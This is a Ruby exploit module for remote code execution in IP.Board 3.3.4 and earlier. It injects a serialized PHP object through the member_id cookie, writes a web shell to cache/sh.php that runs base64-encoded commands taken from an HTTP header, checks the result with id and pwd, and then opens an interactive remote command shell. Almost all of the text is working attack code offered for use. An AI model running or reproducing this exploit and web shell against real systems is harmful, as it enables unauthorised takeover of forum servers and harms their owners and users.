# IPB <= 3.3.4 Unserialized RCE
# Originally Found by EgiX, Ruby Version by Hood3dRob1n

class IPBSerializeRCE < Core::CoreShell
	def initialize
		#Basic Info:
		module_name='IPBSerializeRCE'
		module_info={
			'Name'        => 'IPB <= 3.3.4 Unserialized RCE Exploit',
			'Version'     => 'v0.01b',
			'Description' => "This is a exploit for IPB <= 3.3.4 Unserialized RCE. Vulnerable code in IPSCookie::get() method defined in /admin/sources/base/core.php\n\nThe vulnerability is caused due to this method unserialize user input passed through cookies without a proper sanitization. The only one check is done at line 4026, where is controlled that the serialized string starts with 'a:', but this is not sufficient to prevent a \"PHP Object Injection\" because an attacker may send a serialized string which represents an array of objects. This can be exploited to execute arbitrary PHP code via the \"__destruct()\" method of the \"dbMain\" class, which calls the \"writeDebugLog\" method to write debug info into a file. PHP code may  be injected only through the $_SERVER['QUERY_STRING'] variable, for this reason successful exploitation of this vulnerability requires short_open_tag to be enabled.\n\n\tTarget => Target IPB Forum with path to index.php (http(s)://site.com/forum/index.php)\n\tProxyIp => Proxy IP Address\n\tProxyPort => Proxy Port\n\tUsername/Password => To be used for Proxy Auth if needed",
			'Author'      => 'Originally Found by EgiX, Ruby Version by Hood3dRob1n'
		}

		module_required={ 'Target' => "http://jazzyjefffreshprince.com/forum/index.php" }
		module_optional={ 'ProxyIp' => 'nil', 'ProxyPort' => 'nil', 'Username' => 'nil', 'Password' => 'nil' } 

		@non_set_private_options={ 'Auth' => 'False', 'Cookie' => 'nil' } #Don't Need for this

		if $module_name.nil?
			pluginRegistrar(module_name,module_info,module_required,module_optional)
		else
			isitup
		end
	end

	def isitup
		#Initialize our Http::EasyCurb request object with any special values needed, otherwise mark them to nil....
		http = Http::EasyCurb.new(@non_set_private_options['Cookie'],@non_set_private_options['Auth'],$module_optional['ProxyIp'],$module_optional['ProxyPort'],$module_optional['Username'],$module_optional['Password'])

		rez = http._get($module_required['Target'])

		#If responds favorably to request to provided forum index.php link then proceed, else bail out with a blaze of gunfire :p
		if rez[1] == 200 or rez[1] == 301 or rez[1] == 302
			puts "[".light_green + "*".white + "] Site appears to be up".light_green + "....".white
			#Check if set-cookie was set, if so grab it for use in a minute...
			if rez[3] =~ /set-cookie: (.+)/i
				ocoo = $1
				ocoo2 = ocoo.split('; ')[0]
			end

			#Find Server Type Using 'Server' Header Field in Server Response
			if rez[3] =~ /server: (.+)/i
				orez = $1
			end
			if not orez.nil?
				if orez =~ /IIS/ or orez =~ /Windows/i or orez =~ /Win32/i or orez =~ /Win64/i
					puts "[".light_green + "*".white + "] Windows Server".light_green + ": #{orez}".white
				elsif orez =~ /Apache\/|CentOS|Red Hat|Debian|Fedora|Linux\/SuSE/i
					puts "[".light_green + "*".white + "] Unix Server".light_green + ": #{orez}".white
				else
					puts "[".light_green + "*".white + "] Unknown Server".light_green + ": #{orez}".white
				end
			end
			puts "[".light_green + "*".white + "] Cookies".light_green + ": #{ocoo}".white if not ocoo.nil?
			puts "[".light_green + "*".white + "] Set-Cookie".light_green + ": #{ocoo2}".white if not ocoo2.nil?
			feedmecereal
		else
			puts "[".light_red + "X".white + "] Provided site and path don't seem to be working! Please double check and try again or check manually".light_red + ".......".white
			puts "[".light_red + "X".white + "] ".light_red
		end
	end

	def feedmecereal
		puts "[".light_yellow + "*".white + "] Attempting to trigger exploit".light_yellow + "......".white
		payload = URI.encode('a:1:{i:0;O:+15:"db_driver_mysql":1:{s:3:"obj";a:2:{s:13:"use_debug_log";i:1;s:9:"debug_log";s:12:"cache/sh.php";}}}');
		phpcode = '<?error_reporting(0);print(___);passthru(base64_decode($_SERVER[HTTP_CMD]));die;?>';
		path = "#{$module_required['Target']}?#{phpcode}"

		#Initialize new Http::EasyCurb request object with our cookie values added in
		@non_set_private_options['Cookie'] = "member_id=#{payload}"

		#Trigger Vuln with payload and phpcode set in place....
		@http = Http::EasyCurb.new(@non_set_private_options['Cookie'],@non_set_private_options['Auth'],$module_optional['ProxyIp'],$module_optional['ProxyPort'],$module_optional['Username'],$module_optional['Password'])
		rez = @http._get(path)

		if rez[1] == 200 or rez[1] == 301 or rez[1] == 302
			puts "[".light_green + "*".white + "] Site seems to be accepting injection prep, will confirm in just a sec".light_green + ".......".white
			tracker=0
			@path = "#{$module_required['Target'].sub('index.php', '')}cache/sh.php"

"J2lkJw=="
			rez = getsome(@path, "J2lkJw==") #`id`
				if rez[0] =~ /___(.*)\s/
					id = $1
				end
			rez = getsome(@path, "J3B3ZCc=") #`pwd`

			if rez[1] == 200 or rez[1] == 301 or rez[1] == 302
				if rez[0] =~ /___(.*)\s/
					funkyfresh = $1
					puts "[".light_green + "*".white + "] Confirmed - Successful Injection".light_green + "!".white
					puts "[".light_green + "*".white + "] ID".light_green + ": #{id}".white
					puts "[".light_green + "*".white + "] PWD".light_green + ": #{funkyfresh}".white
				end
			else
				tracker += 1
			end
			if "#{tracker}".to_i > 1
				puts "[".light_red + "X".white + "] Injection doesn't seem to be working, sorry".light_red + "......".white
			else
				ipbshell
			end
		else
			puts "[".light_red + "X".white + "] Doesn't seem to be working! Please double check and try again or check manually".light_red + ".......".white
			puts "[".light_red + "X".white + "] ".light_red
		end
	end

	def getsome(getlink, cmdValue)
		ch = Curl::Easy.new(getlink) do |curl|
			curl.useragent = 'Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/4.0; GTB7.4; InfoPath.2; SV1; .NET CLR 3.3.69573; WOW64; en-US)'
			if not $module_optional['ProxyIp'] == 'nil'
				if not @non_set_private_options['Auth'].to_i == 'nil'
					#NO PASS CAN BE USED B/C basic_auth in use!
					curl.proxy_url = $module_optional['ProxyIp']
					curl.proxy_port = $module_optional['ProxyPort'].to_i
				else
					#CAN USE AUTH HERE
					if $module_optional['Username'] == 'nil'
						curl.proxy_url = $module_optional['ProxyIp']
						curl.proxy_port = $module_optional['ProxyPort'].to_i
					else
						curl.proxy_url = $module_optional['ProxyIp']
						curl.proxy_port = $module_optional['ProxyPort'].to_i
						curl.proxypwd = "#{$module_optional['Username']}:#{$module_optional['Password']}"
					end
				end
			end
			curl.headers["Cmd"] = "#{cmdValue}"
			curl.cookies = @non_set_private_options['Cookie']
			if not @non_set_private_options['Auth'].to_i == 'nil'
				curl.http_auth_types = :basic
				curl.username = $module_optional['Username']
				curl.password = $module_optional['Password']
			end
		end
		ch.perform
		return ch.body_str, ch.response_code, ch.total_time, ch.header_str
	end

	def ipbshell
		puts "[".light_green + "*".white + "] Dropping to IPB Pseudo Shell".light_green + ".....".white
		puts "[".light_yellow + "*".white + "] Type '".light_yellow + "EXIT".white + "' or '".light_yellow + "QUIT".white + "' to exit & return to Main Menu".light_yellow + ".....".white

		prompt = "(IPB-CMD-Shell)> "
		while line = Readline.readline("#{prompt}", true)
			cmd = line.chomp
			case cmd
				when /^clear|^cls|^banner/i
					cls
					banner
					puts
				when /^exit|^quit/i
					puts "[".light_red + "X".white + "] OK, Exiting IPB Shell & returning to Main Menu".light_red + "....".white
					puts "[".light_yellow + "X".white + "] Got r00t".light_yellow + "?".white
					break
				else
					fun = Base64.encode64("#{cmd}")
					rez = getsome(@path, "#{fun}") #`id`
					if rez[0] =~ /___(.+)/m
						results=$1
						puts "#{results}".cyan
					else
						puts "[".light_red + "X".white + "] Nothing Found".light_red + "?".white
					end
				end
		end
	end
end

IPBSerializeRCE.new
